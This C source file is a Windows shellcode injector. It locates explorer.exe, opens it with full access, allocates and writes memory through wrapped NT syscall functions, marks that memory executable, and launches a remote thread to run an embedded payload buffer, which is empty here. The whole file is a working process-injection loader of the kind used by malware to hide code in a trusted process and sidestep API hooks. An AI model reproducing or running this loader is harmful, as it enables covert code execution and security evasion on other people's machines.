#include "Wrappers.h"
#include "Utils.h"
#include <windows.h>
#include <stdio.h>

#ifdef _DEBUG
#define print_debug(...) printf(__VA_ARGS__)
#else
#define print_debug(...) printf(__VA_ARGS__)
#endif

//https://gist.github.com/kkent030315/b508e56a5cb0e3577908484fa4978f12
unsigned char buf[] = "";

int main()
{
	HANDLE hProcess = NULL, hRemoteThread = NULL;
	PVOID pRemoteAddr = NULL;
	DWORD dwTgtProcId, oldProtect;
	SIZE_T bytesWritten = 0;
	SIZE_T bufLen = sizeof(buf);

	if (!Init())
		return 0;

	dwTgtProcId = FindProcessByName(TEXT("explorer.exe"));
	if (dwTgtProcId == 0)
	{
		print_debug("[-] target process not found\n");
		return 0;
	}
	print_debug("[+] pid: %d\n", dwTgtProcId);

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwTgtProcId);
	if (hProcess == NULL)
	{
		print_debug("[-] handle not obtained\n");
		goto Exit;
	}
	print_debug("[+] handle obtained\n");

	CallNtAllocateVirtualMemory(hProcess, &pRemoteAddr, 0, &bufLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	print_debug("[+] remote memory allocation succeded: %p\n", pRemoteAddr);

	CallNtWriteVirtualMemory(hProcess, pRemoteAddr, buf, sizeof(buf), &bytesWritten);
	print_debug("[+] written %lld bytes\n", bytesWritten);

	CallNtProtectVirtualMemory(hProcess, &pRemoteAddr, &bufLen, PAGE_EXECUTE_READWRITE, &oldProtect);
	print_debug("[+] virtual protect\n");

	CallCreateRemoteThread(&hRemoteThread, THREAD_ALL_ACCESS, NULL, hProcess, pRemoteAddr, NULL, FALSE, 0, 0, 0, NULL);
	print_debug("[+] remote thread created\n");

Exit:
	if (hRemoteThread != NULL) CloseHandle(hRemoteThread);
	if (hProcess != NULL) CloseHandle(hProcess);

	getchar();
	return 0;
}